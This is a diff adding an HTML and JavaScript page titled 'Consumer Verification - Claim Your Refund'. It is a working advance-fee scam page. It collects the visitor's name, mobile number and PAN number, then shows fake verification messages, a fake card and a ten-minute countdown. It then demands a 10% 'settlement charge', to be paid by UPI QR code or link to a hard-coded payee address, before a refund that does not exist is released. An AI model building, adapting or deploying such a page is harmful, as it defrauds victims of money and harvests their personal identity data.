@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consumer Verification - Claim Your Refund</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    
+    <style>
+        :root {
+            --stars-blue: #003067;
+            --success-green: #00b050;
+            --white: #ffffff;
+            --gold: #ffcc00;
+            --danger-red: #d9534f;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Poppins', sans-serif; background-color: var(--white); color: #333; }
+
+        header { background: var(--white); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+        .logo h2 { color: var(--stars-blue); font-size: 1.8rem; font-weight: 700; }
+
+        .page { display: none; min-height: 80vh; padding: 40px 5%; }
+        .page.active { display: block; animation: fadeIn 0.4s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .content-box { max-width: 500px; margin: 0 auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); background: #fff; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-family: inherit; }
+        label { font-size: 0.85rem; font-weight: 600; display: block; margin-top: 10px; }
+        .btn-action { width: 100%; background: var(--stars-blue); color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 1rem; margin-top: 10px; }
+
+        .timer-box { 
+            background: #fff5f5; border: 1px solid #feb2b2; color: var(--danger-red);
+            padding: 10px; border-radius: 8px; font-weight: 700; margin-bottom: 20px;
+            display: inline-block; width: 100%; text-align: center;
+        }
+
+        .loader-wrapper { text-align: center; display: none; flex-direction: column; align-items: center; justify-content: center; height: 60vh; }
+        .radar-pulse { width: 80px; height: 80px; background: var(--stars-blue); border-radius: 50%; position: relative; animation: pulse 1.5s infinite; margin-bottom: 20px; }
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 48, 103, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 40px rgba(0, 48, 103, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(0, 48, 103, 0); }
+        }
+
+        .stars-card { background: #333; color: var(--gold); width: 100%; max-width: 400px; height: 230px; margin: 20px auto; border-radius: 20px; padding: 30px; text-align: left; }
+        .card-chip { width: 50px; height: 35px; background: var(--gold); border-radius: 6px; margin-bottom: 25px; }
+        .card-number { font-size: 1.5rem; letter-spacing: 3px; margin-bottom: 10px; }
+        .card-holder { text-transform: uppercase; font-weight: 700; font-size: 1.1rem; }
+
+        .order-table { width: 100%; border: 1px solid #ddd; border-radius: 12px; overflow: hidden; }
+        .row { display: flex; justify-content: space-between; padding: 12px 20px; border-bottom: 1px solid #eee; }
+        .row.total-row { background: var(--stars-blue); color: white; font-weight: 700; }
+        .buy-now-btn { width: 100%; background: var(--success-green); color: white; border: none; padding: 18px; font-size: 1.3rem; font-weight: 700; cursor: pointer; }
+
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; justify-content: center; align-items: center; }
+        .modal-overlay.active { display: flex; }
+        .modal-content { background: white; padding: 30px; border-radius: 15px; text-align: center; width: 340px; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo"><h2>Consumer Verification</h2></div>
+        <div class="contact-info" style="color:var(--stars-blue); font-weight: bold;"></div>
+    </header>
+
+    <main id="step-1" class="page active">
+        <div class="content-box">
+            <h3 style="text-align: center; margin-bottom: 20px;">Claim Your Refund</h3>
+            <label>Full Name</label>
+            <input type="text" id="in-name" placeholder="Official Name">
+            <label>Mobile Number</label>
+            <input type="tel" id="in-mobile" placeholder="10 Digit Mobile" maxlength="10">
+            <button class="btn-action" onclick="goToStep2()">CLAIM NOW</button>
+        </div>
+    </main>
+
+    <main id="step-2" class="page">
+        <div class="content-box">
+            <h3 style="margin-bottom: 20px;">Refund Verification</h3>
+            <label>Claim Refund Amount (₹)</label>
+            <input type="number" id="in-amount" placeholder="Enter amount to claim">
+            <label>Current Status</label>
+            <select id="in-status">
+                <option value="Pending">Pending Verification</option>
+                <option value="Review">Under Review</option>
+            </select>
+            <label>PAN Number / Verification ID</label>
+            <input type="text" id="in-pan" placeholder="ABCDE1234F" style="text-transform: uppercase;">
+            <button class="btn-action" onclick="startLoading()">VERIFY CLAIM</button>
+        </div>
+    </main>
+
+    <div id="loader" class="loader-wrapper">
+        <div class="radar-pulse"></div>
+        <p id="status-text" style="font-weight: 600; color: var(--stars-blue);">Verifying Refund ID...</p>
+    </div>
+
+    <main id="step-3" class="page">
+        <div class="content-box" style="max-width: 600px; text-align: center;">
+            <div class="timer-box"><i class="fas fa-clock"></i> Offer Expires In: <span id="timer">10:00</span></div>
+            
+            <p style="font-size: 1.1rem; margin-bottom: 25px;">
+                Congrats! <span id="out-name-msg" style="font-weight: bold;">user</span>, Pay Settlement Verification Charges To Unlock Your 
+                <b id="out-amount-msg" style="color: var(--stars-blue);">₹ 0.00</b> Refund Instantly!
+            </p>
+
+            <div class="stars-card">
+                <div class="card-chip"></div>
+                <div class="card-number">**** **** **** 6782</div>
+                <div style="display: flex; gap: 20px; font-size: 0.65rem; margin-bottom: 20px;">
+                    <div>VALID FROM<br><span style="color:#fff">28/02/2026</span></div>
+                    <div>VALID TO<br><span style="color:#fff">28/08/2026</span></div>
+                </div>
+                <div class="card-holder" id="out-card-name">NAME</div>
+            </div>
+
+            <div class="order-table">
+                <div class="row">
+                    <span>Settlement Charges (10%)</span>
+                    <span style="color:var(--success-green); font-weight: bold;" id="out-fee-display">₹ 0.00</span>
+                </div>
+                <div class="row total-row">
+                    <span>Grand Total</span>
+                    <span id="out-total-display">₹ 0.00</span>
+                </div>
+                <button class="buy-now-btn" onclick="handlePayment()">PAY NOW</button>
+            </div>
+        </div>
+    </main>
+
+    <div class="modal-overlay" id="payment-modal">
+        <div class="modal-content">
+            <h3 style="color: var(--stars-blue);">Scan to Pay</h3>
+            <div id="qrcode" style="margin: 20px 0;"></div>
+            <p style="font-weight: bold;">Amount: <span id="modal-amount">₹0.00</span></p>
+            <button class="btn-action" onclick="document.getElementById('payment-modal').classList.remove('active')">CLOSE</button>
+        </div>
+    </div>
+
+    <script>
+        let userData = {};
+        let finalFee = 0;
+
+        function goToStep2() {
+            const name = document.getElementById('in-name').value;
+            const mobile = document.getElementById('in-mobile').value;
+            if(!name || mobile.length < 10) { alert("Enter valid details"); return; }
+            userData.name = name; userData.mobile = mobile;
+            document.getElementById('step-1').classList.remove('active');
+            document.getElementById('step-2').classList.add('active');
+        }
+
+        function startLoading() {
+            const amount = document.getElementById('in-amount').value;
+            if(!amount || amount <= 0) { alert("Enter valid claim amount"); return; }
+            
+            userData.amount = parseFloat(amount);
+            // DYNAMIC CALCULATION: 10%
+            finalFee = (userData.amount * 0.10).toFixed(2);
+
+            document.getElementById('step-2').classList.remove('active');
+            document.getElementById('loader').style.display = 'flex';
+
+            const msgs = ["Connecting to Secure Server...", "Validating PAN...", "Calculating Settlement Charges...", "Finalizing Refund Settlement..."];
+            let i = 0;
+            const interval = setInterval(() => { if(i < msgs.length) document.getElementById('status-text').innerText = msgs[i++]; }, 1000);
+
+            setTimeout(showStep3, 4000);
+        }
+
+        function showStep3() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('out-name-msg').innerText = userData.name.toLowerCase();
+            document.getElementById('out-amount-msg').innerText = "₹ " + userData.amount.toLocaleString('en-IN', {minimumFractionDigits:2});
+            document.getElementById('out-card-name').innerText = userData.name.toUpperCase();
+            
+            // Display Calculated Fees
+            document.getElementById('out-fee-display').innerText = "₹ " + parseFloat(finalFee).toLocaleString('en-IN', {minimumFractionDigits:2});
+            document.getElementById('out-total-display').innerText = "₹ " + parseFloat(finalFee).toLocaleString('en-IN', {minimumFractionDigits:2});
+            document.getElementById('modal-amount').innerText = "₹ " + parseFloat(finalFee).toLocaleString('en-IN', {minimumFractionDigits:2});
+
+            document.getElementById('step-3').classList.add('active');
+            startTimer(600);
+            
+            // Generate QR with DYNAMIC Amount
+            const upiUrl = `upi://pay?pa=qwalle0493690026836@yesbankltd&pn=StarsHub&am=${finalFee}&cu=INR&tn=SettlementFee`;
+            document.getElementById("qrcode").innerHTML = "";
+            new QRCode(document.getElementById("qrcode"), { text: upiUrl, width: 200, height: 200 });
+        }
+
+        function startTimer(duration) {
+            let timer = duration, min, sec;
+            const display = document.querySelector('#timer');
+            const interval = setInterval(() => {
+                min = parseInt(timer / 60, 10);
+                sec = parseInt(timer % 60, 10);
+                display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
+                if (--timer < 0) { clearInterval(interval); display.textContent = "EXPIRED"; }
+            }, 1000);
+        }
+
+        function handlePayment() {
+            const upiUrl = `upi://pay?pa=qwalle0493690026836@yesbankltd&pn=StarsHub&am=${finalFee}&cu=INR&tn=SettlementFee`;
+            window.location.href = upiUrl;
+            setTimeout(() => { document.getElementById('payment-modal').classList.add('active'); }, 600);
+        }
+    </script>
+</body>
+</html>
